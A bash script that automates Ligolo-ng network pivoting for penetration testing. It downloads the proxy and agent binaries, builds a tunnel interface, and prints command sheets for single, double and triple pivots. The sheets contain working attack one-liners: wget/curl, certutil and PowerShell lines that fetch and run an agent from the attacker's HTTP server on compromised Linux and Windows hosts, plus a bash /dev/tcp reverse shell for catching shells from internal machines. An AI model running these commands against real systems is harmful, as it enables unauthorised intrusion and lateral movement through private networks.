#!/bin/bash
#==============================================================================
#                         LIGOLO-NG AUTOMATION v3.0
#==============================================================================
# FIXED:
#   - Uses CONSISTENT port (11601) for proxy - no confusion in double pivot!
#   - HTTP port is random (to avoid conflicts with common services)
#   - Proper double pivot listener commands
#   - Full interactive console
#   - Clear step-by-step guides
#==============================================================================

set -o pipefail

LIGOLO_VERSION="v0.7.2-alpha"
WORK_DIR="$HOME/ligolo"

# FIXED PORTS - Important for double pivot!
LIGOLO_PORT=11601  # ALWAYS 11601 - makes double pivot easy!

#------------------------------------------------------------------------------
# COLORS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

#------------------------------------------------------------------------------
# LOGGING
#------------------------------------------------------------------------------
info()    { echo -e "${CYAN}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; }
cmd()     { echo -e "    ${GREEN}$1${NC}"; }
note()    { echo -e "    ${WHITE}# $1${NC}"; }

#------------------------------------------------------------------------------
# PORT MANAGEMENT
#------------------------------------------------------------------------------
random_port() {
    local min=${1:-10000}
    local max=${2:-60000}
    if [[ -r /dev/urandom ]]; then
        echo $(( min + $(od -An -tu2 -N2 /dev/urandom | tr -d ' ') % (max - min) ))
    else
        echo $(( min + RANDOM % (max - min) ))
    fi
}

port_in_use() {
    local port=$1
    ss -tuln 2>/dev/null | grep -qE ":${port}\b" || \
    netstat -tuln 2>/dev/null | grep -qE ":${port}\b"
}

find_free_port() {
    local base=${1:-10000}
    local max_attempts=50
    local port
    
    for ((i=0; i<max_attempts; i++)); do
        port=$(random_port 10000 60000)
        if ! port_in_use "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    port=$base
    while port_in_use "$port"; do ((port++)); done
    echo "$port"
}

check_ligolo_port() {
    # Check if our fixed port 11601 is available
    if port_in_use "$LIGOLO_PORT"; then
        warn "Port $LIGOLO_PORT is in use!"
        local proc=$(ss -tuln 2>/dev/null | grep ":$LIGOLO_PORT " | head -1)
        echo -e "    ${WHITE}$proc${NC}"
        echo ""
        read -p "Kill the process using port $LIGOLO_PORT? [y/N]: " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            local pid=$(lsof -ti:$LIGOLO_PORT 2>/dev/null | head -1)
            if [[ -n "$pid" ]]; then
                kill -9 "$pid" 2>/dev/null
                sleep 1
                success "Process killed"
            fi
        else
            # Find alternative port
            LIGOLO_PORT=$(find_free_port 11601)
            warn "Using alternative port: $LIGOLO_PORT"
            warn "UPDATE your double pivot listener commands accordingly!"
        fi
    fi
}

get_default_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 addr show tap0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 route get 1 2>/dev/null | grep -oP 'src \K\d+(\.\d+){3}' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}'
}

#------------------------------------------------------------------------------
# BINARY FUNCTIONS
#------------------------------------------------------------------------------
verify_binary() {
    local file=$1
    local min_size=1000000
    
    [[ ! -f "$file" ]] && return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
    [[ $size -lt $min_size ]] && return 1
    
    if [[ "$file" == *.exe ]]; then
        head -c 2 "$file" 2>/dev/null | grep -q "MZ" || return 1
    else
        file "$file" 2>/dev/null | grep -q "ELF" || return 1
    fi
    return 0
}

get_binary_info() {
    local file=$1
    if [[ -f "$file" ]]; then
        local size=$(stat -c%s "$file" 2>/dev/null)
        local md5=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
        echo "$size:$md5"
    else
        echo "0:none"
    fi
}

setup_binaries() {
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR" || exit 1
    
    local BASE_URL="https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}"
    
    # Download proxy
    if ! verify_binary "proxy"; then
        info "Downloading proxy..."
        rm -f proxy proxy.tar.gz 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_proxy_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O proxy.tar.gz; then
            tar -xzf proxy.tar.gz proxy 2>/dev/null
            rm -f proxy.tar.gz LICENSE README.md 2>/dev/null
            chmod +x proxy 2>/dev/null
            verify_binary "proxy" && success "Proxy downloaded" || error "Proxy verification failed"
        else
            error "Failed to download proxy"
        fi
    else
        success "Proxy OK"
    fi
    
    # Download Linux agent
    if ! verify_binary "agent"; then
        info "Downloading Linux agent..."
        rm -f agent agent.tar.gz 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O agent.tar.gz; then
            tar -xzf agent.tar.gz agent 2>/dev/null
            rm -f agent.tar.gz LICENSE README.md 2>/dev/null
            chmod +x agent 2>/dev/null
            verify_binary "agent" && success "Linux agent downloaded" || error "Linux agent verification failed"
        else
            error "Failed to download Linux agent"
        fi
    else
        success "Linux agent OK"
    fi
    
    # Download Windows agent
    if ! verify_binary "agent.exe"; then
        info "Downloading Windows agent..."
        rm -f agent.exe agent.zip 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_windows_amd64.zip" -O agent.zip; then
            unzip -qo agent.zip agent.exe 2>/dev/null
            rm -f agent.zip LICENSE README.md 2>/dev/null
            verify_binary "agent.exe" && success "Windows agent downloaded" || error "Windows agent verification failed"
        else
            error "Failed to download Windows agent"
        fi
    else
        success "Windows agent OK"
    fi
    
    # Get binary info
    local agent_info=$(get_binary_info "$WORK_DIR/agent")
    local win_info=$(get_binary_info "$WORK_DIR/agent.exe")
    AGENT_SIZE=$(echo "$agent_info" | cut -d: -f1)
    AGENT_MD5=$(echo "$agent_info" | cut -d: -f2)
    WIN_SIZE=$(echo "$win_info" | cut -d: -f1)
    WIN_MD5=$(echo "$win_info" | cut -d: -f2)
}

#------------------------------------------------------------------------------
# SETUP INTERFACE
#------------------------------------------------------------------------------
setup_interface() {
    if ip link show ligolo &>/dev/null; then
        sudo ip link set ligolo up 2>/dev/null
        success "Interface 'ligolo' ready"
    else
        info "Creating ligolo interface..."
        if sudo ip tuntap add user "$(whoami)" mode tun ligolo 2>/dev/null; then
            sudo ip link set ligolo up
            success "Interface 'ligolo' created"
        else
            error "Failed to create interface"
            warn "Run manually:"
            cmd "sudo ip tuntap add user $(whoami) mode tun ligolo"
            cmd "sudo ip link set ligolo up"
        fi
    fi
    sudo ip route add 240.0.0.1/32 dev ligolo 2>/dev/null || true
}

#------------------------------------------------------------------------------
# GENERATE COMMANDS FILE
#------------------------------------------------------------------------------
generate_commands() {
    cat > "$WORK_DIR/commands.txt" << CMDEOF
================================================================================
LIGOLO-NG COMMANDS
================================================================================
Attacker IP:    $ATTACKER_IP
Ligolo Port:    $LIGOLO_PORT  <-- FIXED PORT (important for double pivot!)
HTTP Port:      $HTTP_PORT
--------------------------------------------------------------------------------
Linux Agent:    $AGENT_SIZE bytes | MD5: $AGENT_MD5
Windows Agent:  $WIN_SIZE bytes | MD5: $WIN_MD5
================================================================================

=== START HTTP SERVER (new terminal) ===

cd $WORK_DIR && python3 -m http.server $HTTP_PORT

=== LINUX PIVOT ===

wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

# Curl alternative
curl -so /tmp/agent http://$ATTACKER_IP:$HTTP_PORT/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

# Background
nohup /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert &>/dev/null &

=== WINDOWS PIVOT ===

certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

powershell -c "iwr http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\Windows\Temp\agent.exe; C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"

=== LIGOLO CONSOLE ===

session                  # Use ARROW KEYS to select!
ifconfig                 # Show pivot's networks
start                    # Start tunnel
listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp
listener_list

=== ADD ROUTES (new terminal on attacker) ===

sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
ip route show dev ligolo

================================================================================
DOUBLE PIVOT - STEP BY STEP
================================================================================

YOUR PROXY PORT IS: $LIGOLO_PORT (REMEMBER THIS!)

SCENARIO: Attacker -> Pivot1 (172.16.5.15) -> Pivot2 (internal)

--- STEP 1: FIRST PIVOT MUST BE WORKING ---
- Pivot1 agent connected
- Tunnel started (you ran 'start')
- Route added: sudo ip route add 172.16.0.0/16 dev ligolo
- You can reach Pivot2 (test: ping 172.16.5.X)

--- STEP 2: CREATE LISTENER ON PIVOT1 ---
[In Ligolo console]

listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp
                          ^^^^^^^^^^^^            ^^^^^^^^^^^^
                          |                       |
                          |                       +-- YOUR PROXY PORT!
                          +-- Port Pivot1 listens on

This means: Pivot1:$LIGOLO_PORT --> Your machine:$LIGOLO_PORT (proxy)

--- STEP 3: TRANSFER AGENT TO PIVOT2 ---

Option A - Through the tunnel (if HTTP accessible):
  # Pivot2 downloads from your HTTP server through tunnel
  wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent
  # Or for Windows:
  certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\Windows\Temp\agent.exe

Option B - From Pivot1 (start temp HTTP server):
  # On Pivot1:
  cd /tmp && python3 -m http.server 8888
  
  # On Pivot2 (Linux):
  wget http://172.16.5.15:8888/agent -O /tmp/agent
  
  # On Pivot2 (Windows):
  certutil -urlcache -f http://172.16.5.15:8888/agent.exe C:\Windows\Temp\agent.exe

--- STEP 4: RUN AGENT ON PIVOT2 ---

Linux:
  chmod +x /tmp/agent
  /tmp/agent -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert
                      ^^^^^^^^^^^
                      PIVOT1's INTERNAL IP!

Windows:
  C:\Windows\Temp\agent.exe -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert

--- STEP 5: IN LIGOLO CONSOLE ---

session              # Use ARROW KEYS! You'll see Pivot2 now
                     # Select Pivot2, press ENTER
ifconfig             # See Pivot2's networks (e.g., 10.10.10.0/24)

--- STEP 6: ADD ROUTE FOR NEW NETWORK ---
[In a new terminal on your attacker machine]

sudo ip route add 10.10.10.0/24 dev ligolo

--- STEP 7: START TUNNEL FOR PIVOT2 ---
[In Ligolo console, Pivot2 selected]

start

DONE! You can now access 10.10.10.0/24 directly from attacker!

================================================================================
TRIPLE PIVOT
================================================================================

Same process from Pivot2:

[In Ligolo, select Pivot2 session]
listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

[On Pivot3]
/tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert

[In Ligolo]
session              # Select Pivot3
ifconfig
# Add route: sudo ip route add 192.168.1.0/24 dev ligolo
start

================================================================================
REVERSE PORT FORWARD (catch shells from internal network)
================================================================================

# Step 1: Listener on attacker
nc -lvnp 4444

# Step 2: In Ligolo (any session)
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Step 3: Internal target connects to PIVOT's internal IP
bash -i >& /dev/tcp/172.16.5.15/4444 0>&1
                    ^^^^^^^^^^^^
                    PIVOT's INTERNAL IP!

================================================================================
COMMON ERRORS & FIXES
================================================================================

ERROR: "dial tcp 127.0.0.1:XXXXX: connect: connection refused"
  CAUSE: Listener port doesn't match your proxy port!
  FIX:   Your proxy is on port $LIGOLO_PORT
         Use: listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

ERROR: "TLS handshake error"
  CAUSE: Agent binary is corrupted
  FIX:   Re-download agent, verify size > 1MB

ERROR: "yamux: keepalive failed"
  CAUSE: Network timeout/instability
  FIX:   Re-run agent, check network connectivity

ERROR: "session 1" doesn't work
  CAUSE: Ligolo uses interactive selection
  FIX:   Type 'session', then use ARROW KEYS to select!

================================================================================
CMDEOF

    success "Commands saved to $WORK_DIR/commands.txt"
}

#------------------------------------------------------------------------------
# PRINT INSTRUCTIONS
#------------------------------------------------------------------------------
print_instructions() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}                    LIGOLO-NG READY${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  Attacker IP:    ${GREEN}$ATTACKER_IP${NC}"
    echo -e "  Ligolo Port:    ${GREEN}$LIGOLO_PORT${NC}  ${YELLOW}<-- FIXED (for double pivot)${NC}"
    echo -e "  HTTP Port:      ${GREEN}$HTTP_PORT${NC}  ${YELLOW}(random)${NC}"
    echo -e "  Agent Size:     ${WHITE}$AGENT_SIZE${NC} bytes"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 1: Start HTTP server${NC} ${YELLOW}(new terminal)${NC}"
    cmd "cd $WORK_DIR && python3 -m http.server $HTTP_PORT"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: On pivot (Linux)${NC}"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent"
    cmd "chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: On pivot (Windows)${NC}"
    cmd "certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\\Windows\\Temp\\agent.exe"
    cmd "C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 3: After agent connects${NC}"
    echo -e "    ${GREEN}session${NC} ${YELLOW}(use ARROW KEYS!)${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 4: Add routes${NC} ${YELLOW}(new terminal)${NC}"
    cmd "sudo ip route add 172.16.0.0/16 dev ligolo"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  ${WHITE}Full commands:${NC}  ${YELLOW}cat $WORK_DIR/commands.txt${NC}"
    echo -e "  ${WHITE}Double pivot:${NC}   ${YELLOW}$0 pivot${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

#------------------------------------------------------------------------------
# SHOW PIVOT GUIDE
#------------------------------------------------------------------------------
show_pivot_guide() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              DOUBLE PIVOT SETUP${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${RED}${BOLD}  IMPORTANT: Your proxy port is $LIGOLO_PORT${NC}"
    echo -e "${RED}${BOLD}  All listener commands MUST use this port!${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}Scenario: Attacker -> Pivot1 (172.16.5.15) -> Pivot2${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${YELLOW}--- Prerequisites ---${NC}"
    echo -e "  ${GREEN}✓${NC} Pivot1 agent connected"
    echo -e "  ${GREEN}✓${NC} Tunnel started ('start' command)"
    echo -e "  ${GREEN}✓${NC} Route added: sudo ip route add 172.16.0.0/16 dev ligolo"
    echo -e "  ${GREEN}✓${NC} You can reach Pivot2 through Pivot1"
    echo ""
    echo -e "${YELLOW}--- Step 1: Create listener on Pivot1 ---${NC}"
    note "In Ligolo console (Pivot1 session)"
    echo ""
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "    ${WHITE}This forwards: Pivot1:$LIGOLO_PORT → Your proxy:$LIGOLO_PORT${NC}"
    echo ""
    echo -e "${YELLOW}--- Step 2: Transfer agent to Pivot2 ---${NC}"
    note "Option A: Through tunnel"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent"
    echo ""
    note "Option B: From Pivot1 (start HTTP server on Pivot1 first)"
    cmd "# On Pivot1: python3 -m http.server 8888"
    cmd "wget http://172.16.5.15:8888/agent -O /tmp/agent"
    echo ""
    echo -e "${YELLOW}--- Step 3: Run agent on Pivot2 ---${NC}"
    echo ""
    echo -e "  ${WHITE}Linux:${NC}"
    cmd "chmod +x /tmp/agent"
    cmd "/tmp/agent -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^${NC}"
    echo -e "                        ${YELLOW}PIVOT1's INTERNAL IP!${NC}"
    echo ""
    echo -e "  ${WHITE}Windows:${NC}"
    cmd "C:\\Windows\\Temp\\agent.exe -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${YELLOW}--- Step 4: In Ligolo console ---${NC}"
    cmd "session"
    note "Use ARROW KEYS to select Pivot2, press ENTER"
    cmd "ifconfig"
    note "See Pivot2's networks"
    echo ""
    echo -e "${YELLOW}--- Step 5: Add route for new network ---${NC}"
    note "In a NEW terminal on attacker"
    cmd "sudo ip route add 10.10.10.0/24 dev ligolo"
    echo ""
    echo -e "${YELLOW}--- Step 6: Start tunnel ---${NC}"
    note "In Ligolo (Pivot2 selected)"
    cmd "start"
    echo ""
    echo -e "${GREEN}${BOLD}Done! You can now access the new network directly!${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              TRIPLE PIVOT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    note "From Pivot2 session in Ligolo:"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    note "On Pivot3:"
    cmd "/tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    note "In Ligolo:"
    cmd "session"
    note "Select Pivot3"
    cmd "sudo ip route add 192.168.1.0/24 dev ligolo"
    cmd "start"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              REVERSE PORT FORWARD${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    note "Catch shells from internal network"
    echo ""
    echo -e "  ${WHITE}On attacker:${NC}"
    cmd "nc -lvnp 4444"
    echo ""
    echo -e "  ${WHITE}In Ligolo:${NC}"
    cmd "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp"
    echo ""
    echo -e "  ${WHITE}On internal target:${NC}"
    cmd "bash -i >& /dev/tcp/PIVOT_INTERNAL_IP/4444 0>&1"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              COMMON ERRORS${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${RED}\"connection refused\"${NC}"
    echo -e "    Listener port doesn't match proxy port!"
    echo -e "    Your proxy is on: ${GREEN}$LIGOLO_PORT${NC}"
    echo -e "    Use: ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo ""
    echo -e "  ${RED}\"TLS handshake error\"${NC}"
    echo -e "    Agent binary corrupted. Re-download, verify size > 1MB"
    echo ""
    echo -e "  ${RED}\"session 1\" doesn't work${NC}"
    echo -e "    Use ARROW KEYS to select session!"
    echo ""
}

#------------------------------------------------------------------------------
# ADD ROUTE
#------------------------------------------------------------------------------
add_route() {
    local network="$1"
    local iface="${2:-ligolo}"
    
    if [[ -z "$network" ]]; then
        read -p "Enter network (e.g., 172.16.0.0/16): " network
    fi
    
    if [[ "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        if sudo ip route add "$network" dev "$iface" 2>/dev/null; then
            success "Route added: $network via $iface"
        else
            warn "Route may already exist"
        fi
    else
        error "Invalid format. Use CIDR (e.g., 172.16.0.0/16)"
    fi
    
    echo ""
    info "Current routes through ligolo:"
    ip route show dev "$iface" 2>/dev/null | while read line; do
        echo -e "    ${GREEN}$line${NC}"
    done
}

#------------------------------------------------------------------------------
# STATUS
#------------------------------------------------------------------------------
show_status() {
    echo ""
    echo -e "${WHITE}${BOLD}=== LIGOLO STATUS ===${NC}"
    echo ""
    
    echo -n "Interface: "
    if ip link show ligolo &>/dev/null; then
        echo -e "${GREEN}UP${NC}"
    else
        echo -e "${RED}NOT FOUND${NC}"
    fi
    
    echo -n "Proxy:     "
    if pgrep -f "ligolo.*proxy" &>/dev/null; then
        local port=$(ss -tlnp 2>/dev/null | grep ligolo | grep -oP ':\K\d+' | head -1)
        echo -e "${GREEN}RUNNING${NC} (port: $port)"
    else
        echo -e "${YELLOW}NOT RUNNING${NC}"
    fi
    
    echo ""
    echo "Routes:"
    local routes=$(ip route show dev ligolo 2>/dev/null)
    if [[ -n "$routes" ]]; then
        echo "$routes" | while read line; do
            echo -e "    ${GREEN}$line${NC}"
        done
    else
        echo -e "    ${YELLOW}(none)${NC}"
    fi
    
    echo ""
    echo "Files in $WORK_DIR:"
    for f in proxy agent agent.exe; do
        if [[ -f "$WORK_DIR/$f" ]]; then
            local size=$(stat -c%s "$WORK_DIR/$f" 2>/dev/null)
            echo -e "    ${GREEN}✓${NC} $f: $size bytes"
        else
            echo -e "    ${YELLOW}○${NC} $f: not found"
        fi
    done
    echo ""
}

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
cleanup() {
    info "Stopping processes..."
    pkill -9 -f "ligolo.*proxy" 2>/dev/null || true
    
    info "Removing interface..."
    sudo ip link set ligolo down 2>/dev/null || true
    sudo ip link delete ligolo 2>/dev/null || true
    
    success "Cleanup complete"
}

#------------------------------------------------------------------------------
# RUN PROXY
#------------------------------------------------------------------------------
run_proxy() {
    cd "$WORK_DIR" || exit 1
    
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  LIGOLO PROXY - PORT $LIGOLO_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${YELLOW}SESSION:${NC}      Use ${GREEN}ARROW KEYS${NC} to select!"
    echo -e "  ${YELLOW}AFTER CONNECT:${NC} ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "  ${YELLOW}ADD ROUTES:${NC}   ${GREEN}sudo ip route add <NET>/24 dev ligolo${NC} (new terminal)"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  DOUBLE PIVOT QUICK REFERENCE${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${WHITE}1.${NC} First pivot working (agent connected, tunnel started, routes added)"
    echo -e "  ${WHITE}2.${NC} ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo -e "  ${WHITE}3.${NC} On Pivot2: ${GREEN}/tmp/agent -connect PIVOT1_IP:$LIGOLO_PORT -ignore-cert${NC}"
    echo -e "  ${WHITE}4.${NC} ${GREEN}session${NC} (select Pivot2) → ${GREEN}ifconfig${NC}"
    echo -e "  ${WHITE}5.${NC} New terminal: ${GREEN}sudo ip route add <NEW_NET>/24 dev ligolo${NC}"
    echo -e "  ${WHITE}6.${NC} ${GREEN}start${NC}"
    echo ""
    echo -e "  ${WHITE}Full guide:${NC} ${YELLOW}$0 pivot${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    
    # Run proxy - fully interactive!
    exec ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    case "${1:-}" in
        -h|--help|help)
            echo "Usage: $0 [command] [options]"
            echo ""
            echo "Commands:"
            echo "  (no args)              Interactive setup"
            echo "  start IP               Quick start with IP"
            echo "  route NETWORK          Add route"
            echo "  pivot                  Double pivot guide"
            echo "  status                 Show status"
            echo "  commands               Show commands"
            echo "  cleanup                Stop everything"
            echo ""
            echo "Examples:"
            echo "  $0                          # Interactive"
            echo "  $0 start 10.10.14.5         # Quick start"
            echo "  $0 route 172.16.0.0/16      # Add route"
            echo "  $0 pivot                    # Pivot guide"
            exit 0
            ;;
        
        start)
            ATTACKER_IP="${2:-$(get_default_ip)}"
            HTTP_PORT=$(find_free_port 8080)
            
            check_ligolo_port
            setup_binaries
            setup_interface
            generate_commands
            print_instructions
            
            info "Starting proxy on port $LIGOLO_PORT..."
            run_proxy
            ;;
        
        route)
            add_route "$2" "${3:-ligolo}"
            ;;
        
        pivot)
            # Try to read HTTP_PORT from commands.txt if available
            if [[ -f "$WORK_DIR/commands.txt" ]]; then
                HTTP_PORT=$(grep "^HTTP Port:" "$WORK_DIR/commands.txt" 2>/dev/null | awk '{print $3}')
            fi
            HTTP_PORT=${HTTP_PORT:-8080}
            ATTACKER_IP=$(get_default_ip)
            show_pivot_guide
            ;;
        
        status)
            show_status
            ;;
        
        commands)
            [[ -f "$WORK_DIR/commands.txt" ]] && cat "$WORK_DIR/commands.txt" || error "Run setup first"
            ;;
        
        cleanup)
            cleanup
            ;;
        
        *)
            # Interactive
            echo ""
            echo -e "${CYAN}========================================${NC}"
            echo -e "${WHITE}${BOLD}       LIGOLO-NG AUTOMATION v3.0${NC}"
            echo -e "${CYAN}========================================${NC}"
            echo ""
            
            local default_ip=$(get_default_ip)
            read -p "Enter your IP [$default_ip]: " input_ip
            ATTACKER_IP="${input_ip:-$default_ip}"
            
            if ! [[ "$ATTACKER_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                error "Invalid IP"
                exit 1
            fi
            
            # Fixed Ligolo port, random HTTP port
            check_ligolo_port
            HTTP_PORT=$(find_free_port 8080)
            
            echo ""
            info "Configuration:"
            echo -e "    IP:          ${GREEN}$ATTACKER_IP${NC}"
            echo -e "    Ligolo Port: ${GREEN}$LIGOLO_PORT${NC} ${YELLOW}(fixed - for double pivot)${NC}"
            echo -e "    HTTP Port:   ${GREEN}$HTTP_PORT${NC} ${YELLOW}(random)${NC}"
            echo ""
            
            setup_binaries
            setup_interface
            generate_commands
            print_instructions
            
            read -p "Start proxy now? [Y/n]: " choice
            if [[ ! "$choice" =~ ^[Nn]$ ]]; then
                info "Starting proxy on port $LIGOLO_PORT..."
                echo ""
                run_proxy
            else
                echo ""
                info "To start later:"
                cmd "cd $WORK_DIR && ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
            fi
            ;;
    esac
}

main "$@"
